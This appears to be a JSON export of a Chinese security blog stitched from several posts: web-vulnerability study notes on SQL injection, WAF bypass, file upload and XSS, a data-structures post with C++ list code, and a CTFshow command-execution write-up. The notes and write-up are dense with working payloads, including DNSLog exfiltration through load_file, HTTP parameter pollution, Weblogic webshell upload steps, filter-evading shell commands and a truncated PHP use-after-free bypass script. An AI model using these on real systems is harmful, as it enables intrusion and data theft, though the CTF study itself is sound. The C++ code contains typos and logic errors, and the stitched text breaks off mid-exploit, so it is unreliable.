'^xxx[a-z]'\t匹配xxx以及xxx...等\n\nif(条件,返回值真,返回值假)\n\nsleep(时间秒)\n\nmid(字符串,起始位置,截取长度)\n\nsubstr(字符串,起始位置,截取长度)\n\nleft(字符串,截取长度)\n\nlength(字符串)\n\nord=ascii\n\nascii(字符)=ascii值\n\n**报错盲注**\n\n常用函数：`floor,updatexml,extractvalue`\n\nextractvalue函数：\n\n语法：`extractvalue(目标xml文档,xml路径)`\n\n报错：当目标xml文档不存在时会返回xml路径\n\n1、通过floor报错,注入语句如下:\n`and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)`\n\n2、通过ExtractValue报错,注入语句如下:\n`and extractvalue(1, concat(0x7e,想查询的内容,0x7e))`\n\n3、通过UpdateXml报错,注入语句如下:\n`and 1=(updatexml(1,concat(0x7e,(select database())),1))`\n\n剩下的可参考这篇文章：https://www.jianshu.com/p/bc35f8dd4f7c\n\n**布尔盲注**\n\n返回页面只有正确与否两种形式，通过if语句以及返回值来得到结果\n\n\n\n\n\n\n\n**时间盲注**\n\n常用函数：`if,sleep`\n\nif函数：\n\n语法：if(条件,返回值真,返回值假)\n\nsleep函数：\n\n语法：sleep(时间（单位为秒）)\n\n用法：~~乖乖用sqlmap啊喂~~\n\n可以先用`length()`判断长度\n\n`and sleep(if(database()='a',5,0))`\n\n**Access偏移注入**\n\n**偏移注入主要是针对知道表，但是不知道字段的。**\n\n~~可以先试试看看源代码中表单的值或者URL特征等~~\n\n```\n首先猜测表：select exists(select * from sys_admin);\n然后爆出字段数：order by x\n然后爆出显示位：union select 1,2,3,4,5....,x from sys_admin\n爆出显示位的基础上依次递减，直到页面恢复正常为止：union select 1,2,3,4,5....,y,* from sys_admin\n最终字段数就等于c=x-2*(x-y)\n一级偏移语句： union select 1,2,3,4,5....c,* from (sys_admin as a inner join sys_admin as b on a.id = b.id)\n```\n\n## DAY17 web漏洞 SQL注入 二次注入 加解密 DNS等注入\n\n**加密解密**\n\n查看抓包内容中是否有加密后的字符串，尝试解密后进行注入时应先进行加密再进行\n\n**二次注入**\n\n在首次进行注册等写入数据库的操作时，将SQL语句写入数据库，在更新数据等操作被执行时，调用出前面构造好的SQL语句导致注入\n\n```\n例子：\n原始语句：\nupdate set password='$new_pass' where username='$user' and password='$current_pass'\n当Jlan正常执行该语句时\nupdate set password='123456' where username='Jlan' and password='000000'\n但是如果有个人尝试二次注入构造出以下用户名\nusername=Jlan'#\n此时这个人尝试更改密码，将会执行下列语句\nupdate set password='123456' where username='Jlan'#' and password='000000'\n#后面的语句全被忽略了，所以真正执行的是下面的语句\nupdate set password='123456' where username='Jlan'\n此时黑客虽然没有拿到Jlan的密码但却成功更改了Jlan的密码，完成二次注入\n```\n\n**DNSLog外带注入**（仅支持Windows）\n\n该方法使用条件\n\n- secure_file_priv **拥有读写权限**\n\n```sql\nsecure_file_priv = \"\"       # 可以读取磁盘目录\nsecure_file_priv = \"D:\\\"    # 可以读取D盘文件\nsecure_file_priv = null     # load_file限制，不能加载文件\n```\n\n- 在mysql 5.5.34 默认为空可以加载文件，之后的版本为NULL，不能加载文件\n\n```\nshow global variables like 'secure%';  //查看是否有写限制\n```\n\n在读写文件条件严苛时，可尝试load_file函数将数据带出\n\n```\nload_file(concat('\\\\\\\\',(想要带出的内容),'.你的URL\\\\kkk'))\n```\n\n此时load_file函数会尝试将访问URL，通过我们构造的URL即可将数据带出\n\n## DAY18 web漏洞 SQL注入 堆叠注入 WAF绕过\n\n**堆叠查询注入**\n\n将多条语句进行执行，使用分割符进行分割，可以直接进行一个数据的插入\n\n限制：只有部分数据库（MySQL）支持堆叠注入\n\n**WAF绕过**\n\n{% pullquote mindmap mindmap-md %}\n\n- WAF绕过\n  - 数据\n    - 大小写\n    - 加密解密\n    - 编码解码\n    - 等价函数\n    - 特殊符号\n    - 反序列化\n    - 注释符混用\n  - 方式\n    - 更改提交方式\n    - 变异\n  - 其他\n    - Fuzz大法\n    - 数据库特性\n    - 垃圾数据已出\n    - HTTP参数污染\n\n{% endpullquote %}\n\n**数据库特性**\n\nMySQL：\n\n```\n/*!50001 语句*/;\n意为只有5.00.01以上版本数据库才会执行\n```\n\n**绕过**\n\n1. ```\n   union#kkk%0Aselect 1,2,3#\n   %0A意为换行符，所以最终执行的语句如下\n   union \n   select 1,2,3#\n   ```\n\n2. IP白名单绕过\n\n   ```\n   构造HTTP请求头\n   \n   \n   ```\n\n3. 访问静态资源（旧版本WAF有效）\n\n   ```\n   /index.php/1.txt/?id=payload\n   ```\n\n4. URL白名单（旧版本WAF有效）\n\n   ```\n   WAF可能对管理页面等不进行拦截，可以尝试插入admin,manage,admin等来尝试匹配绕过\n   /?a=/admin/&id=payload\n   ```\n\n5. 构造爬虫\n\n   ```\n   尝试伪造搜索引擎等爬虫的UA，WAF可能放行\n   ```\n\n\n**HTTP参数污染**\n\n示例：\n\n```\n?id=1/**&id=-1 union select 1,2,3#*/\n当我们使用上面的语句传参时，WAF收到的id参数如下\n1/**&id=-1 union select 1,2,3#*/\n可见我们攻击内容包含在注释中，被WAF忽略，但实际上PHP接收到的参数如下\nid=-1 union select 1,2,3#*/\n成功执行了联合查询\n```\n\n\n\n- Apache+PHP 取后面参数\n- Tmocat+JSP 取前面参数\n- Apache+Perl 取前面参数\n- Apache+Python 取所有参数生成List\n- IIS+ASP 取所有参数\n\n\n\n\n\n\n\n\n\n\n\n\n\n## DAY20  web漏洞 文件上传\n\n文件上传漏洞\n\n{% pullquote mindmap mindmap-md %}\n\n- 文件上传漏洞\n  - 验证/绕过\n    - 前端\n      - JS防护\n\n    - 后端\n      - 黑名单\n        - 特殊解析后缀\n        - .htaccess解析\n        - 大小写绕过\n        - 点绕过\n        - 空格绕过\n        - ::$$DATA绕过\n        - 配合解析漏洞\n        - 双后缀名绕过\n\n      - 白名单\n        - MIME绕过\n        - %00截断\n        - 0x00截断\n        - 0x0a截断\n\n      - 内容及其他\n        - 文件头检测\n        - 二次渲染\n        - 条件竞争\n        - 突破getimagesize\n        - 突破exif_imagetype\n\n- 漏洞/修复\n  - 解析漏洞\n    - IIS6/7.x\n    - Apache\n    - Nginx\n\n  - CMS漏洞\n  - 编辑器漏洞\n    - fckeditor\n    - ewebeditor\n    - ckeditor\n    - kindedit\n\n  - CVE等漏洞\n    - CVE-2015-5253\n    - CVE-2017-12615\n    - CVE-2019-2618\n\n- WAF绕过\n  - 安全狗\n  - 宝塔\n  - 云盾\n\n\n{% endpullquote %}\n\n{% pullquote mindmap mindmap-md %}\n\n- 利用思路\n  - 常规\n    - 扫描获取上传\n    - 会员中心上传\n    - 后台系统上传\n    - 各种途径上传\n  - CMS\n    - 已知CMS源码\n  - 编辑器\n    - ckeditor\n    - fckeditor\n    - kindeditor\n    - xxxxeditor\n  - 其他\n    - 代码审计\n    - 平台或第三方应用等\n\n{% endpullquote %}\n\n**nginx解析漏洞**\n\n```\n原理：Nginx拿到文件路径/test.jpg/1.php后，一看后缀是.php，便认为该文件是php文件，转交给php去处理。php一看/test.jpg/1.php不存在，便删去最后的/test.php，又看/test.jpg存在，便把/test.jpg当成要执行的文件了，又因为后缀为.jpg，php认为这不是php文件，于是返回“Access denied.”。\n\n这其中涉及到php的一个选项：cgi.fix_pathinfo，该值默认为1，表示开启。开启这一选项可帮助“修理”路径，举个例子，当php遇到文件路径“/aaa.xxx/bbb.yyy/ccc.zzz”时，若“/aaa.xxx/bbb.yyy/ccc.zzz”不存在，则会去掉最后的“/ccc.zzz”，然后判断“/aaa.xxx/bbb.yyy”是否存在，若存在，则把“/aaa.xxx/bbb.yyy”当做文件“/aaa.xxx/bbb.yyy/ccc.zzz”，若“/aaa.xxx/bbb.yyy”仍不存在，则继续去掉“/bbb.yyy”，以此类推。\n\n而在新版本的php中该漏洞可能不成功是因为新的php引入了“security.limit_extensions”，限制可执行文件的后缀，默认只执行.php文件\n```\n\n在上传后的文件中加/xxx.php可尝试解析漏洞\n\n**Weblogic任意文件上传漏洞（CVE-2018-2894）**\n\n[复现链接](https://blog.csdn.net/weixin_43625577/article/details/97001677)\n\n利用条件：Weblogic管理端未授权的两个页面存在任意上传jsp文件漏洞，**进而获取服务器权限**\n\n影响版本：weblogic 10.3.6.0、weblogic 12.1.3.0、weblogic 12.2.1.2、weblogic 12.2.1.3。\n\n```\n在base_domain中的‘高级’中勾选‘启动Web服务测试页’选项，保存配置\n访问/ws_utc/config.do\n设置Work Home Dir为\n/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css，访问这个目录是无需权限的，这一点很重要。\n然后点击‘安全’——>‘添加’，上传jsp木马\n审查查看时间戳\n访问/ws_utc/css/config/keystore/[时间戳]_[文件名]即可执行webshell\n```\n\n\n\n\n\n**文件上传骚操作**\n\n某些网站在文件上传后不会立刻提交数据包到后端，而是先在本地预览，等用户二次确认后才会将数据进行传输，并且大部分不使用普通的POST文件传输，而是经过加密的字符串，就离谱\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n## DAY25 web漏洞 XSS跨站\n\n产生原理\n\n上传了JS代码网页渲染导致的\n\n危害影响\n\n反射型：数据不会被存储到服务器\n\n存储型：数据被存储到数据库\n\nDOM型\n\n生效特点\n\n反射型\n\n提交x——>后端——>执行返回结果\n\n存储型\n\n提交x——>后端存储——>取出数据——>执行结果\n\nDOM型\n\n提交x——>本地浏览器静态前端代码执行——>被提交到后端执行\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"},{"title":"数据结构","url":"/2022/02/14/数据结构/","content":"\n# 数据结构\n\n## 线性结构\n\n### 线性表顺序结构实现\n\n<!--more-->\n\n```C++\n//数组静态分配\ntypedef struct{\n  char name[100];\n  int num;\n  float sum;\n}ElementType;\ntypedef struct{\n\tElementType data[MaxSize];\n\tint length;\n}SqList;\n\n//数组动态分配\ntypedef struct{\n  char name[100];\n  int num;\n  float sum;\n}ElementType;\ntypedef struct{\n\tElementType *data;\n\tint length\n}SqList;\nSqList L;\nL.data=(ElementType*)malloc(sizeof(ElementType)*MaxSize);\n//#include <cstdlib>\n//malloc(m)函数，开辟m字节长度的地址空间，并返回这段空间的首地址\n//sizeof(x)运算，计算变量x的长度\n//free(p)函数，释放指针p所指变量的存储空间，彻底删除一个变量\n//typedef type name 定义种类为type的变量种类\n\n\n//各种功能实现\n//函数结果状态代码\n#define TRUE 1\n#define FALSE 0\n#define OK 1\n#define ERROR 1\n#define INFEASIBLE -1\n#define OVERFLOW -2\n//Status是所有函数的类型，值是函数结果状态代码\ntypedef int Status;\n\n//线性表初始化\nStatus InitList(SqList &L){\n  L.data=new ElementType[MAXSIZE];\n  if(!L.data)\n    exit(OVERFLOW);//内存开辟失败\n  L.length=0;\n  return OK;\n}\nvoid DestoryList(SqList &L){\n  if(L.data)\n    delete L.data;\n}\nvoid ClearList(SqList &L){\n  L.length=0;\n}\nint GetLength(SqList L){\n\treturn L.length;  \n}\nbool IsEmpty(SqList L){\n  if(L.length==0)\n    return true;\n  return false;\n}\nint GetElement(SqList L,int i,ElementType &e){\n\tif(i>=1&&i<=L.length){\n    e=L.data[i-1];\n    return OK;\n  }\n  return ERROR;\n}\nint FindElementByNum(SqList L,int num){\n  for(int i=0;i<L.length;i++){\n    if(L.data[i]==num){\n      return i+1;\n    }\n  }\n  return 0;\n}\nStatus Insert(SqList &L,int i,ElementType e){\n  if(i<1||i>L.length+1)\n    return ERROR;\n  if(L.length==MAXSIZE)\n    return ERROR;\n  for(int j=L.length-1;j>=i-1;j--){\n    L.data[j+1]=L.data[j];\n  }\n  L.data[i-1]=e;\n  L.length++;\n  return OK;\n}\nStatus Delete(SqList &L,int i,ElementType &e){\n  if(i<1||i>L.length+1)\n    return ERROR;\n  e=L.data[i-1]\n  for(int j=L.length-1;i<=j;i++){\n    L.data[i-1]=L.data[i];\n  }\n  L.length--;\n  return OK;\n}\n```\n\n### 线性表链式结构实现\n\n```C++\ntypedef struct{\n\tint num;\n  char name[10];\n  int score;\n}ElementType;\ntypedef struct Lnode{\n\tElementType data;\n\tstruct Lnode *next;\n}Lnode,*LinkList;\nLinkList L;<==>LNode *p\nStatus InitList(LinkList &L){\n  L=new LNode;\n  L->next=NULL;\n  return OK;\n}\nbool IsEmpty(LinkList L){\n  if(L->next==NULL)\n  \treturn 1;\n  return 0;\n}\nStatus DestoryList(LinkList &L){\n  LNode *p;\n  while(L!=NULL){\n    p=L;\n    L=L->next;\n    delete p;\n  }\n  return OK;\n}\nStatus ClearList(LinkList &L){\n  LNode *p,*q;\n  p=L->next;\n  while(L!=NULL){\n    q=p->next;\n    delete p;\n    p=q;\n  }\n  L->next=NULL;\n  return OK;\n}\nint ListLength(LinkList L){\n  int i=0;\n  LinkList p=L->next;\n  while(p!=NULL){\n    i++;\n    p=p->next;\n  }\n  return i;\n}\nint GetElement(LinkList L,int i,ElementType &e){\n\tif(i<1||i>L.length)\n    return ERROR;\n  LinkList p=L;\n  for(int j=1;j<=i;j++){\n    p=p->next;\n  }\n  e=p->data;\n  return OK;\n}\n*LNode FindElementGetAddress(LinkList L,ElementType e){\n  LinkList p=L->next;\n  while(p&&p->data!=e){\n    p=p->next;\n  }\n  return p;\n}\nint FindElementGetNum(LinkList L,ElementType e){\n  LinkList p=L->next;\n  int j=1;\n  whlie(p&&p->data!=e){\n    p=p->next;\n    j++;\n  }\n  if(p)\n    return j;\n  return 0\n}\nStatus Insert(LinkList &L,int i,ElementType e){\n  LinkList p=L;\n  LinkList s;\n  int j=1\n  s->data=e;\n  whlie(p&&j<=i-1){\n    j++;\n    p=p->next;\n  }\n  if(!p)\n    return ERROR;\n  LinkList s->next=p->next;\n  p->next=s;\n  return OK;\n}\nStatus Delete(LinkList &L,int i,ElementType &e){\n  LinkList p=L,s;\n  whlie(p&&j<=i-1){\n    j++;\n    p=p->next;\n  }\n  if(!(p->next)||j>i-1)\n    return ERROE\n  s=p->next;\n  p->next=s->next;\n  e=s->data\n  delete s;\n  return OK\n}\n//单链表建立方法：头插法\n//1、建立一个空表，重复读入数据\n//2、生成新节点，将读入数据存放到新节点的数据域中\n//3、从最后一个节点开始，依次将各节点插入到链表的前端\nL=new LNode;\np=new LNode;\np->data=a;\np->next=L->next;\nL->next=p;\n  \n//单链表建立方法：头插法\n    \nvoid CreateList_R(LinkList &L,int n){\n\tL=new LNode;\n  L->next=NULL;\n  r=L;\n  for(int i=0;i<n;i++){\n    p=new LNode;\n    cin>>p->data;\n    p->next=NULL;\n    r->next=p;\n    r=p;\n  }\n}\np->data=a;\np->next=NULL;\nr->next=p;//尾指针\nr=p\n    \n//循环链表\n//好处：从表中任意阶段出发均可找到表中其他节点\nLinkList Connect(LinkList &a,LinkList &b){\n  LinkList p=a->next;\n  a->next=b->next->next\n  delete b->next;\n  b->next=p;\n  return b;\n}\n//双向链表\ntypedef struct DuLNode{\n  ElementType data;\n  struct DuLNode *prior,*next;\n}DuLNode,*DuLinkList;\n    \n//线性表合并\nvoid Union(List &La,List Lb){\n  La_len=ListLength(La);\n  Lb_len=ListLength(Lb);\n  for(int i=1;i<=Lb_len;i++){\n    LNode e;\n    GetElement(Lb,i,e);\n    if(!FindElement(La,e))\n    \tInsert(&La,++La_len,e);\n  }\n}\n//有序表合并\nvoid Union(LinkList &La,LinkList &Lb,LinkList &Lc){\n  pa=La->next;\n  pb=Lb->next;\n  pc=Lc=La;\n  while(pa&&pb){\n    if(pa->data<=pb->data){\n      pc->next=pa;\n      pc=pa;\n      pa=pa->next;\n    }\n    else{\n      pc->next=pb;\n      pc=pb;\n      pb=pb->next;\n    }\n    pc->next=pa?pa:pb;\n    delete Lb;\n  }\n}\n    \n    \n    \n  \n    \n    \n    \n    \n    \n    \n    \n    \n  \n  \n  \n  \n  \n  \n\n\n\n```\n\n### 栈和队列\n\n```C++\n//栈只能在表尾进行插入和删除\n//队列只能在表尾插入，表头删除\n```\n\n","tags":["C++"]},{"title":"CTFshow命令执行","url":"/2022/02/07/CTFshow命令执行/","content":"\n可用于执行php函数的函数：\n\n```\neval()、assert()、preg_replace(\"/test/e\",$_POST[\"cmd\"],\"jutst test\")\n//正则规则中含有/e修饰符就存在代码执行漏洞\ncreate_function()\n```\n\n可用于执行系统命令的函数：\n\n```php\nexec()//返回命令执行结果，加echo\npassthru()//执行后直接显示结果\nsystem()//执行后直接显示结果,返回值：成功则返回命令输出的最后一行， 失败则返回 false\nshell_exec()//返回命令执行结果，加echo\n`命令`//返回命令执行结果，加echo\npopen()\nproc_open()\npcntl_exec()\n```\n\n<!--more-->\n\n可用于替代空格的字符：\n\n```\n%09、$IFS$9、 ${IFS}、$IFS%09、< 、<>、%20等\n```\n\n可用于读取文件的命令：\n\n```\ncat\ntac\nhead\nmore\nless\ncut\nnl\n```\n\n通配符：\n\n```\n*代表任意位\n?代表一位\n```\n\n\n\n##### 29\n\n```\npayload:?c=echo(`cat%20f*`);\n```\n\n题目过滤了flag，使用通配符绕过，f*代表匹配所有以f开头的文件，\\`内部为执行的命令，通过echo得到返回值\\`\n\n##### 30\n\n```\npayload:?c=echo(`cat%20f*`);\n```\n\n题目过滤了flag,system,php，同上\n\n##### 31\n\n```\npayload:?c=echo(`tac%09f*`);\n```\n\n题目过滤了flag,system,php,cat,sort,shell,小数点,空格，使用%09将空格替代即可\n\n##### 32\n\n```\npayload:?c=include%09$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\n题目过滤了flag,system,php,cat,sort,shell,小数点,空格,单引号,波浪号,echo,分号,括号，可以使用文件包含函数`include()`，include可以实现无括号包含，进而通过`?>`将整个PHP代码闭合即可绕过分号，而后就能做到参数逃逸（因为代码中只检测了c中传入的内容），进而通过传入参数通过php伪协议读取内容\n\n##### 33\n\n```\npayload:?c=include%09$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\n题目过滤了flag,system,php,cat,sort,shell,小数点,空格,单引号,波浪号,echo,分号,括号,双引号，同上\n\n##### 34\n\n```\npayload:?c=include%09$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\n题目过滤了flag,system,php,cat,sort,shell,小数点,空格,单引号,波浪号,echo,分号,括号,双引号,冒号，同上\n\n##### 35\n\n```\npayload:?c=include%09$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\n题目过滤了flag,system,php,cat,sort,shell,小数点,空格,单引号,波浪号,echo,分号,括号,双引号,冒号,左尖括号,等于号，同上\n\n##### 36\n\n```\npayload:?c=include%09$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\n题目过滤了flag,system,php,cat,sort,shell,小数点,空格,单引号,波浪号,echo,分号,括号,双引号,冒号,左尖括号,等于号,数字，将get参数中的数字改为字母即可\n\n##### 37\n\n```\npayload:?c=php://input\n请求体:<?php include \"flag.php\"?>\n或\npayload:?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==\n```\n\ninclude函数开始，过滤了flag，通过php://input伪协议直接包含文件\n\n##### 38\n\n```\npayload:?c=data://text/plain;base64,PD9waHAgaW5jbHVkZSAiZmxhZy5waHAiPz4=\n```\n\n过滤了flag, php,file，通过data伪协议执行include \"flag.php\"\n\n##### 39\n\n```\npayload:?c=data://text/plain,<?php system(\"cat fla*.php\");?>\n```\n\n过滤了flag并且包含的是变量c.php，输入后相当于直接执行输入的PHP命令，由于前面的PHP内容已经闭合，所以后面的.php直接就是.php文本显示，对前面的命令输入没有影响\n\n##### 40\n\n```\npayload:?c=eval(array_pop(next(get_defined_vars())));\n\nPOST:a=system('cat flag.php');\n```\n\nprint_r(get_defined_vars());可以拿到所有已经定义的变量并取得值\n\nnext(变量)可以获得下一个变量\n\narray_pop(数组)弹出数组中的变量为单个独立变量\n\n```\nc=session_start();system(session_id());\npassid=ls\n```\n\n本地修改sessionID传入命令\n\n##### 41\n\n```\n\n```\n\n```\n'/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\&|\\-/i'\n```\n\n可以发现大多数自负都被过滤，查看提示\n\n通过脚本可获取异或（｜）后能得到的所有字符\n\n直接使用脚本\n\n##### 42\n\n```\npayload:?c=cat flag.php;\n```\n\n$c.\" >/dev/null 2>&1\"\n\n题目中将命令输出保存到黑洞中，可通过分号分割命令让第一个执行的命令直接显示\n\n##### 43\n\n```\npayload:?c=tac%20flag.php%26%26\n```\n\n同上题，过滤了cat和分号，通过&&也可进行多命令执行，要进行URL编码\n\n##### 44\n\n```\npayload:?c=tac%20fla*.php%26%26\n```\n\n同上题，过滤了flag，使用通配符\n\n##### 45\n\n```\npayload:?c=tac${IFS}fla*.php%26%26\n```\n\n同上题，过滤了空格，找个能替代的就行\n\n##### 46\n\n```\npayload:?c=tac%09fla?.php%26%26\n```\n\n同上题，过滤了*和$，使用%09（制表符）替代空格\n\n##### 47\n\n```\npayload:?c=tac%09fla?.php%26%26\n```\n\n同上题，过滤了一些读取文件的命令，但没滤tac，直接用\n\n##### 48\n\n```\npayload:?c=tac<fl%27%27ag.php%26%26\n```\n\n同上题，过滤了数字和空格\n\n##### 49\n\n```\npayload:?c=tac<fl%27%27ag.php||\n```\n\n同上题，过滤了水平制表符和&&符，将&更换为｜也可以多命令执行\n\n##### 50\n\n```\npayload:?c=tac<fl%27%27ag.php||\n```\n\n##### 51\n\n```\npayload:?c=nl<fla%27%27g.php||\n```\n\n滤了tac呜呜呜呜用nl\n\n##### 52\n\n```\npayload:?c=nl${IFS}/fl%27%27ag||\n```\n\n滤掉了尖括号但是$回来了\n\n`nl${IFS}fla%27%27g.php||`\n\n但是明显flag不对，所以看一下根目录`ls${IFS}/`发现flag存在\n\n使用nl读取\n\n##### 53\n\n```\npayload:?c=ta%27%27c${IFS}fla?.php\n```\n\n该题内容不同\n\n```\necho($c);\n$d = system($c);\necho \"<br>\".$d;\n```\n\n先将命令打印并执行后获得system函数的返回值并输出，system函数只返回命令执行后输出的最后一行，使用tac\n\n##### 54\n\n```\npayload:c=mv${IFS}fla?.php${IFS}kkk.txt\n/kkk.txt\n```\n\n过滤了单引号绕过，通过mv命令重命名直接读取\n\n##### 55\n\n过滤`\"/\\;|[a-z]|\\`|\\%|\\x09|\\x26|\\>|\\</i\"\n\n**无字母数字的命令执行**\n\n直接讲原理咯\n\n.（点）或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则“.file”的意思就是用bash执行file文件中的命令。用“.file”执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，那不就可以利用“.”来执行它了吗？\n\n咋执行呢，原理是当我们发送一个上传文件的POST包时，这个文件会被储存在临时目录中，默认的文件是`/tmp/phpXXXXXX`(六个随机字符)，那么我们就可以用通配符（?单匹配和*多匹配）来尝试执行我们上传的文件，但是尝试执行后发现不行，我们自己搭建一个php环境看一下为什么\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/ming1.png)\n\n列出相关的文件后发现是因为符合匹配条件的文件数量不止一个，就导致还没运行到我们上传的脚本时就已经结束了，所以我们要尝试用其他的通配符匹配出我们需要的文件，查看相关资料，Linux的glob通配符的相关内容（贴个链接）\n\nhttps://man7.org/linux/man-pages/man7/glob.7.html\n\n除了使用?和*进行任意匹配，还可以使用`[^X]`来排除某个字符，这样我们就可以排除前面包含`-`和`.`文件，继续查看发现还剩下三个文件，而后发现还有一个通配符语法`[X-Y]`可以表示一个范围，而且只有php临时文件中包含大写字母，查询ascii码表发现大写字母位于`@`和`[`之间，所以构造`[@-[]`就可以匹配到我们的文件了\n\n最终payload\n\n首先构建一个上传文件的html\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>POST数据包POC</title>\n</head>\n<body>\n<form action=\"当前链接/?c=./???/????????[@-[]\" method=\"post\" enctype=\"multipart/form-data\">\n    <label for=\"file\">文件名：</label>\n    <input type=\"file\" name=\"file\" id=\"file\"><br>\n    <input type=\"submit\" name=\"submit\" value=\"提交\">\n</form>\n</body>\n</html>\n```\n\n第一个文件内容\n\n```shell\nls\n然后\ncat /var/www/html/flag.php\n```\n\n如果一次不成功就repeater多试几次\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/ming2.png)\n\n拿到flag\n\n##### 57\n\n```\npayload:?c=$((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))\n```\n\n[a-z]|[0-9]|\\`|\\|\\#|\\'|\\\"|\\`|\\%|\\x09|\\x26|\\x0a|\\>|\\<|\\.|\\,|\\?|\\*|\\-|\\=|\\[/i\n\n过滤了大量字符，最终需要构建36即可，没有过滤`$`，而在Linux中$是变量的关键字，所以我们可以使用变量\n\n```\n$(())这个变量中的()代表数学运算，结果为0，所以\necho $(())\n0\n对这个变量进行取反操作结果为\necho ~$(())\n~0\n那么我们再对~0进行数学运算得到的结果就是\necho $((~$(())))\n~1\n所以我们想得到36就是让36个~1相加再取反\necho $((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))\n```\n\n##### 58\n\n```\npayload:\nPOST\nc=file_get_contents('flag.php')\n```\n\n命令执行，突破禁用函数\n\n首先尝试system发现被过滤了，emmmm尝试过后发现能执行系统命令的全被禁用了\n\n那么尝试能否读取文件，使用file_get_contents读取成功，提示中也显示show_source同样可用\n\n##### 59\n\n```\npayload:\nPOST\nc=show_source('flag.php')\n```\n\n能执行系统命令的就别试了，全挂了\n\nshow_source可用\n\n还可尝试通过include来包含文件，再通过PHP伪协议进行读取\n\n```\npayload:?file=php://filter/read=convert.base64-encode/resource=flag.php\nPOST\nc=include($_GET['flie']);\n```\n\n##### 60\n\n```\npayload:\nPOST\nc=highlight_file('flag.php');\n```\n\n上一题可用的方法也可\n\n##### 61\n\n同上\n\n##### 62\n\n```\npayload:\nPOST\nc=include('flag.php');echo $flag;\n```\n\n上面所有方法皆可\n\n##### 63\n\n```\npayload:\nPOST\nc=include('flag.php');var_dump(get_defined_vars());\n```\n\n`get_defined_vars()`可获得所有已定义的变量，当不知道变量名时可使用这个\n\n上面方法同样🉑️\n\n##### 64\n\n```\npayload:\nPOST\nc=include('flag.php');echo $flag;\n```\n\n`scandir('.')`可用于扫描文件，和ls一个意思，当我们不知道文件名时可使用\n\n##### 65\n\n同上\n\n##### 66\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-03-19 17.49.25.png)\n\n尝试失败还被嘲讽了，首先扫描一下文件，发现根目录下有flag.txt，`highlight_file('/flag.txt')`读取即可\n\n```\npayload:\nPOST\nc=highlight_file('/flag.txt');\n```\n\n##### 67\n\n同上\n\n##### 68\n\n```\npayload:\nPOST\nc=include('/flag.txt')\n```\n\n属于是离谱了，直接封了`highlight_file`函数，`var_dump(scandir('/'))`，发现在根目录中，直接include文件，没有php标签即为直接显示源码，等于直接显示flag.txt的内容\n\n##### 69\n\n同上\n\n##### 70\n\n继续白嫖\n\n##### 71\n\n```\npayload:\nPOST\nc=include('/flag.txt');exit();\n```\n\n尝试白嫖发现失败，下载源码进行查看，发现在输出之前将缓冲区中的所有数字字母换成了问号，那么我们让它包含完直接退出就行了\n\n##### 72\n\n文件换位置了哭哭，scandir找不到根目录，var_dump也没了，哭哭\n\n看提示\n\n首先找出文件名\n\n```PHP\npayload:\nPOST\nc=$a=new DirectoryIterator(\"glob:///*\");\nforeach($a as $f)\n{echo($f->__toString().' ');\n} exit(0);\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-03-19 23.52.16.png)uaf脚本如下\n\n```PHP\n<?php\nfunction ctfshow($cmd) {\n    global $abc, $helper, $backtrace;\n\n    class Vuln {\n        public $a;\n        public function __destruct() { \n            global $backtrace; \n            unset($this->a);\n            $backtrace = (new Exception)->getTrace();\n            if(!isset($backtrace[1]['args'])) {\n                $backtrace = debug_backtrace();\n            }\n        }\n    }\n\n    class Helper {\n        public $a, $b, $c, $d;\n    }\n\n    function str2ptr(&$str, $p = 0, $s = 8) {\n        $address = 0;\n        for($j = $s-1; $j >= 0; $j--) {\n            $address <<= 8;\n            $address |= ord($str[$p+$j]);\n        }\n        return $address;\n    }\n\n    function ptr2str($ptr, $m = 8) {\n        $out = \"\";\n        for ($i=0; $i < $m; $i++) {\n            $out .= sprintf(\"%c\",($ptr & 0xff));\n            $ptr >>= 8;\n        }\n        return $out;\n    }\n\n    function write(&$str, $p, $v, $n = 8) {\n        $i = 0;\n        for($i = 